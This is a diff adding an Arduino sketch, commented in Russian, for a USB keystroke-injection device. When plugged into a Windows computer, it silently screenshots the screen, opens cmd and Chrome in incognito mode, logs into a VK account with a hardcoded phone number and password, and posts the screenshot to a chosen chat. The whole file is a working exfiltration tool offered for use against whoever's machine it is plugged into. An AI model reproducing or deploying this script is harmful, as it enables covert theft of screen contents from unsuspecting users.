@@ -1,0 +1,98 @@
+// ВАЖНО
+// Скрипт работает очень долго (примерно 25 сек) и ему необхадима английская раскладка и бездейстсвие во время выполнения скрипта 
+
+// Данный скрипт скидывает скриншот к вам в чат вк
+
+
+
+
+#include "HID-Project.h"  //импортируем библиотеку что бы работать с ней
+#define CMD "cmd.exe"     //необходимо для открытия cmd
+#define EXIT "exit"    //нужно что бы закрыть cmd
+#define OPEN_VK "start chrome.exe --incognito https://vk.com/im?sel=c1"    //здесь вместо моей ссылки надо указать чат в который должнен скинуться скриншот
+#define KILL "taskkill /im chrome.exe /f"  //многновенно завершаем работу для chromа без вопросов
+#define LOGIN "88005553535"      //пишем сюда телефон акаунта в который будем заходить что бы скинуть скрин
+#define PASSWORD "qwerty123"     //а сюда пароль от этого аккаунта
+void setup() {
+}
+
+void loop() {
+    delay(25000);   //ждём 25 сек до запуска программы(за это время при сбое её можно перепрограммировать
+    //делаем скриншот                                       
+    Keyboard.begin(); 
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press(KEY_LEFT_SHIFT);
+    Keyboard.press('s');
+    Keyboard.releaseAll();
+    delay(500);
+    Keyboard.press(KEY_SPACE);
+    Keyboard.releaseAll();
+    delay(400);
+    Keyboard.press(KEY_SPACE);
+    Keyboard.releaseAll();
+    delay(500);
+    Keyboard.press(KEY_RIGHT_ARROW);
+    delay(50);
+    Keyboard.releaseAll();
+    Keyboard.press(KEY_RIGHT_ARROW);
+    delay(50);
+    Keyboard.releaseAll();
+    Keyboard.press(KEY_RIGHT_ARROW);
+    delay(50);
+    Keyboard.releaseAll();
+    delay(50);
+    Keyboard.press(KEY_ENTER);
+    // вызываем 'выполнить'
+    Keyboard.releaseAll();                            
+    Keyboard.press(KEY_LEFT_GUI);                        
+    Keyboard.press('r');                              
+    Keyboard.releaseAll();
+    //открываем командную строку                       
+    delay(100);
+    Keyboard.print(CMD); 
+    delay(50);                                
+    Keyboard.press(KEY_ENTER);                      
+    Keyboard.releaseAll();  
+    //открываем чат с собой
+    delay(500);
+    Keyboard.print(OPEN_VK);
+    delay(100);
+    Keyboard.press(KEY_ENTER);
+    Keyboard.releaseAll();
+    Keyboard.print(EXIT);  //закрываем cmd за то время пока открывается chrome
+    delay(100);
+    Keyboard.press(KEY_ENTER);
+    Keyboard.releaseAll();
+    //проблема в том ,что при открытиии VK в приватной вкладке у нас появляется окно 'Чтобы просматривать эту страницу, нужно зайти на сайт' и мы вводим наши данные что бы мы смогли зайти в чат 
+    delay(6500);  //ждём 6 с половиной минут потому что chrome долго открывается
+    Keyboard.print(LOGIN);   //вводим свой логин
+    delay(100);
+    Keyboard.press(KEY_ENTER);
+    Keyboard.releaseAll();
+    delay(300);
+    Keyboard.print(PASSWORD);  //вводим наш пароль
+    delay(300);
+    Keyboard.press(KEY_ENTER);
+    Keyboard.releaseAll();
+    //вставляем скриншот в наш чат
+    delay(9000); // ждем пока прогрузится ссылка
+    Keyboard.press(KEY_ENTER);
+    Keyboard.releaseAll();
+    delay(200);
+    Keyboard.press(KEY_RIGHT_SHIFT); //вставляем наш скриншот
+    Keyboard.press(KEY_INSERT);
+    Keyboard.releaseAll();
+    delay(1500);
+    Keyboard.press(KEY_ENTER); //тыкаем отправить
+    Keyboard.releaseAll();
+    //удаляем вклаку(CTRL+W)
+    delay(200);
+    Keyboard.press(KEY_RIGHT_CTRL);
+    Keyboard.press('w');
+    Keyboard.releaseAll();
+
+
+    
+    
+    delay(6000000);
+}
